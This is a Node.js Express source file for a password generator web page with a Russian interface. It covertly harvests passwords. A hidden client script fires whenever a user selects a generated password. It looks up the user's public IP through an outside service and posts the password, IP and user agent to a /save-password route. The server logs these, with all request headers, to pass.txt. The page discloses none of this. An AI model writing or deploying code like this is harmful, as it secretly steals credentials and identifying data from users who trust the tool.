const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const generatePassword = require('generate-password');
const path = require('path');

const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({extended: true}));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

function generateHtml() {
  return `
  <!DOCTYPE html>
  <html>
  <head>
  <title>Password Generator</title>
  </head>
  <body>
    <h1>Генератор паролей</h1>
    <form action="/" method="post">
      <label for="length">Длина:</label>
      <input type="number" id="length" name="length" value="8" min="1" max="100" required><br>
      <input type="checkbox" id="includeNumbers" name="Numbers" value="on" checked>
      <label for="includeNumbers">Цифры</label><br>
      <input type="checkbox" id="includeLowerCase" name="LowerCase" value="on">
      <label for="includeLowerCase">Строчные буквы</label><br>
      <input type="checkbox" id="includeUpperCase" name="UpperCase" value="on">
      <label for="includeUpperCase">Заглавные буквы</label><br>
      <input type="checkbox" id="includeSymbols" name="Symbols" value="on" checked>
      <label for="includeSymbols">Символы</label><br>
      <label for="count">Количество паролей:</label>
      <input type="number" id="count" name="count" value="1" min="1" max="25" required><br>
      <input type="submit" value="Сгенерировать">
    </form>
  
   <textarea id="passwordsOutput" rows="25" cols="100" readonly></textarea>
    
    <script>
        document.getElementById('passwordsOutput').addEventListener('select', function(event) {
        const textarea = event.target;
        const start = textarea.selectionStart;
        const end = textarea.selectionEnd;
        const selectedPassword = textarea.value.substring(start, end);
  
        console.log('Selected password:', selectedPassword);
  
        /* Получим ip через стороний сервис, 
           иначе будем получать только локальный ip(127.0.0.1/::1) */
        fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const userData = {
          ip: data.ip, 
          userAgent: navigator.userAgent
        };
  
        fetch('/save-password', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ password: selectedPassword, user: userData })
        })
        .then(response => {
          if(response.ok) {
            console.log('Password and user information saved');
          } else {
            console.error('Save failed');
          }
        })
        .catch(error => {
          console.error('Error:', error);
        });
      })
      .catch(error => {
        console.error('Could not get IP address:', error);
      });
  });
  
  
      document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault();
        const formData = new FormData(event.target);
        const formProps = Object.fromEntries(formData);
  
        fetch('/', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(formProps)
        })
        .then(response => response.text())
        .then(text => {
          document.getElementById('passwordsOutput').value = text;
        })
        .catch(error => {
          console.error('Error:', error);
        });
      });
      
     
    </script>
  </body>
  </html>

  `;
}

app.get('/', (req, res) => {
  //res.sendFile(path.join(__dirname, 'form.html'));
  res.send(generateHtml());
});

app.post('/', (req, res) => {
  const length = parseInt(req.body.length, 10);
  const count = parseInt(req.body.count, 10);
  
  const Numbers = req.body.Numbers === 'on';
  const LowerCase = req.body.LowerCase === 'on';
  const UpperCase = req.body.UpperCase === 'on';
  const Symbols = req.body.Symbols === 'on';

  const passwords = generatePassword.generateMultiple(count, {
    length: length,
    numbers: Numbers,
    lowercase: LowerCase,
    uppercase: UpperCase,
    symbols: Symbols,
    strict: true
  });

  // Возвращаем сгенерированные пароли клиенту для отображения
  res.send(passwords.join('\n'));

});
app.set('trust proxy', true);
app.post('/save-password', (req, res) => {
  const { password, user } = req.body;
 // user.ip = req.ip; 
  user.headers = req.headers; 

  const dataToSave =
   `User IP: ${user.ip},
    Password: ${password},
    UserAgent: ${user.userAgent},
    Headers: ${JSON.stringify(user.headers)}\n`;

  fs.appendFile(path.join(__dirname, 'pass.txt'), dataToSave, (err) => {
    if (err) {
      console.error('Error saving the password:', err);
      res.status(500).send('Error saving data');
    } else {
      res.send('Data saved');
    }
  });
});

app.listen(port, () => {
  console.log(`Password Generator app listening at http://localhost:${port}`);
});
